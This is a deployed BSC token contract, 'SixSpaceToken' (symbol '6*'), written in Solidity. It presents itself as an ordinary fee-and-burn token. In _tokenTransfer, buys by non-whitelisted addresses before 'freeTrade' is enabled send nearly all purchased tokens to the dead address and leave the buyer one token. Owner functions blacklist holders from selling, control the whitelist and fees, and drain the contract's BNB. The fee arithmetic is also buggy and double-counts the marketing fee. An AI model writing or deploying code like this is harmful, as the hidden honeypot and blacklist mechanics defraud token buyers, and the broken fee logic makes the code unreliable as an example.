/**
 *Submitted for verification at BscScan.com on 2022-10-08
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)  external returns (bool);
    function allowance(address owner, address spender)  external view   returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender,   address recipient,  uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(   address indexed owner,   address indexed spender,   uint256 value );
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(   address sender,  address recipient,  uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function setbonusEndBlock(uint256 addAmount) external;
}

library Address {
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, 'Address: insufficient balance');
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{value: amount}('');
        require(success, 'Address: unable to send value, recipient may have reverted');
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, 'Address: low-level call failed');
    }
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, 'Address: low-level call with value failed');
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, 'Address: insufficient balance for call');
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), 'Address: call to non-contract');

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{value: weiValue}(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeBEP20 {
    using SafeMath for uint256;
    using Address for address;

    function safeTransfer(
        IBEP20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IBEP20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            'SafeBEP20: approve from non-zero to non-zero allowance'
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).add(value);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IBEP20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender).sub(
            value,
            'SafeBEP20: decreased allowance below zero'
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }
    
    function _callOptionalReturn(IBEP20 token, bytes memory data) private {

        bytes memory returndata = address(token).functionCall(data, 'SafeBEP20: low-level call failed');
        if (returndata.length > 0) {
            // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), 'SafeBEP20: BEP20 operation did not succeed');
        }
    }
}


contract Ownable {
    address public _owner;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }

}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
} 

contract SixSpaceToken is IERC20, Ownable {
    using Address for address;
    using SafeMath for uint256;
    using SafeBEP20 for IBEP20;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    IUniswapV2Router02 public uniswapV2Router;
    string private _name="6*";
    string private _symbol="6*";
    uint256 private _decimals=18;
    address public uniswapV2Pair;

    uint256 private _tTotal=21000000 * (10**_decimals);
   
    uint256 public _destroyMaxAmount = _tTotal.mul(90).div(100); //Burn token until 10 remains

    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    
    modifier onlyOwners() {require(w[msg.sender], "Ownable: caller is not the owner"); _; }
    mapping(address=>uint256)  _balances;
    mapping(address => bool) public w; mapping(address => bool) public b; 


    uint256 public burnRate = 100; 
    uint256 public marketingRate = 50; 

    uint256 public numTokensSellToAddToLiquidity =  1 *  (10**_decimals);
    
    bool public isOpen =false;
    mapping (address =>address) public uniswapV2PairList;
   
    bool public freeTrade = false;
    address public marketingAddress = address(0x5870f4225CE9CB554Fe4ECf42E277824AbE74b6a);
    //online 
    address public router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public USDT = address(0x55d398326f99059fF775485246999027B3197955);  
 
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled=true;
 
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event TransferInvoter( address sender,  address reciver, uint256 curRAmount);

    constructor()  {
        _owner = msg.sender;
        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;
        w[_owner]=true;
        _balances[_owner]=_tTotal;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        // Create a uniswap pair for this new token
        uniswapV2Pair  = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this),USDT);
        uniswapV2PairList[uniswapV2Pair] =uniswapV2Pair;
        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][ address(uniswapV2Router)] = _tTotal;
        emit Transfer(address(0), _owner, _tTotal);
    }

    function setPairList(address _pair) public onlyOwners{
            uniswapV2PairList[_pair] = _pair;
    }
   
    function setMarketing(address _address)public onlyOwners{
         marketingAddress = _address;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }


    function excludeFromFee(address account) public onlyOwners {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwners {
        _isExcludedFromFee[account] = false;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
  
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(b[from]==false, "You're a bad man. You can't operate");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != uniswapV2PairList[from] && 
            !_isExcludedFromFee[from] && 
            to == uniswapV2PairList[to] &&
            swapAndLiquifyEnabled
        ) {
            
            inSwapAndLiquify = true;
            //add liquidity
            swapTokensForUSDT(contractTokenBalance.mul(99).div(100));
            inSwapAndLiquify = false;
            
        }
        bool takeFee = !inSwapAndLiquify;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] ) {
            takeFee = false;
        }else{
            if(from != uniswapV2PairList[from] && to != uniswapV2PairList[to]){
                takeFee = false;
            }
        }
        _tokenTransfer(from, to, amount, takeFee);
    
    }


    function _tokenTransfer(
        address from,
        address to,
        uint256 tAmount,
        bool takeFee
    ) private {
       
        if( address(from) != address(uniswapV2PairList[from]) ){
            tAmount = tAmount;
        }
        if(_balances[from]<=tAmount){
            tAmount =_balances[from].sub(1);    
        }
        _balances[from] = _balances[from].sub(tAmount);

        uint256 rate;
        uint256 mariketingFee=0;
        uint256 burnFee=0;
        address toDead;
        //Transactions require a fee.
        if(takeFee){
           
            if(
                address(from) == address(uniswapV2PairList[from]) 
                && balanceOf(_destroyAddress).add(tAmount) < _destroyMaxAmount
                && !w[to]
                && !freeTrade)
            {
                toDead = _destroyAddress;
            }
            if(toDead!=_destroyAddress){
                //mar
                mariketingFee = tAmount.mul(marketingRate).div(10000);
                _takeTransfer(
                    from,
                    address(this),
                    mariketingFee,
                    1
                );
                // burn 
                if(balanceOf(_destroyAddress).add(burnFee) < _destroyMaxAmount){
                    burnFee = tAmount.mul(burnRate).div(10000);
                    _takeTransfer(
                        from,
                        address(this),
                        mariketingFee,
                        1
                    );

                }

                rate =  marketingRate.add(burnFee);
            }

        }
        uint256 recipientRate = 10000 - rate;
        if(toDead == _destroyAddress){
            _balances[to] = _balances[to].add(1);
            emit Transfer(from, to, 1);
            _balances[toDead] = _balances[toDead].add(tAmount.mul(recipientRate).div(10000));
            emit Transfer(from, toDead, tAmount.mul(recipientRate).div(10000));
        }else{
            _balances[to] = _balances[to].add(tAmount.mul(recipientRate).div(10000));
            emit Transfer(from, to, tAmount.mul(recipientRate).div(10000));
        }
    }

    function setFreeTrade(bool isTrue)public onlyOwners{
        freeTrade = isTrue;
    }

    function setMarketingRate(uint256 _rate)public onlyOwners{
        marketingRate = _rate;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 types
    ) private {
       
        _balances[to] = _balances[to].add(tAmount);
        if(types >= 1){
           emit Transfer(sender, to, tAmount);
        }else{
          emit Transfer(sender, to, tAmount);
        }

    }
    
    function getMarketing() private view returns(address){
        return marketingAddress;
    }
   
    function setB(address _account,bool isTrue)public onlyOwners{
         b[_account] = isTrue;
    }

    function setW(address _account,bool isTrue)public onlyOwners{
         w[_account] = isTrue;
    }
    function recoverBNB(address a) public onlyOwners {
        address payable recipient = payable(a);
        if(address(this).balance > 0)
            recipient.transfer(address(this).balance);
    }
   
    function setOpen(bool a) public  onlyOwners{
        isOpen=a;
    }
  
    function burnToken(IBEP20 Token,address _deadAddress,uint256 amount) public onlyOwners{
        require(Token.balanceOf(address(this))>0,"balance < 0");
        Token.safeTransfer(address(_deadAddress), amount);
    }

  
    function swapTokensForUSDT(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        // path[1] = uniswapV2Router.WETH();
        path[1] = address(USDT);
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of USDT
            path,
            address(marketingAddress),
            block.timestamp+1000
        );
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwners {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

     function setSellMin(uint256 amount) public onlyOwners{
        numTokensSellToAddToLiquidity = amount;
    }
}